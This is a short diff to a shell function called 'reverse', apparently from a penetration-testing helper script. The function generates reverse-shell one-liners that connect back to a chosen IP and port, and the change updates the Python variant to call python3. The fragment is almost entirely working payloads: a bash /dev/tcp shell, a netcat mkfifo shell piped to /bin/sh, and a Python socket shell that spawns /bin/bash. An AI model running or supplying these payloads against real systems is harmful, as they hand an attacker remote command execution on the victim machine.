@@ -54,7 +54,7 @@ reverse ()
         local ip=$(ip a show $interface | egrep -o "([0-9]{1,3}.){3}[0-9]{1,3}" | head -1);
       fi;
       local randName=$(head -4 /dev/urandom | sha256sum | base64 | head -c 5);
-      declare -A shells=( ["bash"]="bash -i >& /dev/tcp/$ip/$port 0>&1" ["nc"]="mkfifo /tmp/$randName; nc $ip $port 0</tmp/$randName | /bin/sh >/tmp/$randName 2>&1; rm /tmp/$randName" ["python"]="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'" );
+      declare -A shells=( ["bash"]="bash -i >& /dev/tcp/$ip/$port 0>&1" ["nc"]="mkfifo /tmp/$randName; nc $ip $port 0</tmp/$randName | /bin/sh >/tmp/$randName 2>&1; rm /tmp/$randName" ["python"]="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'" );
       if [ -z $language ]; then
         printf "\n";
         for i in "${shells[@]}";do
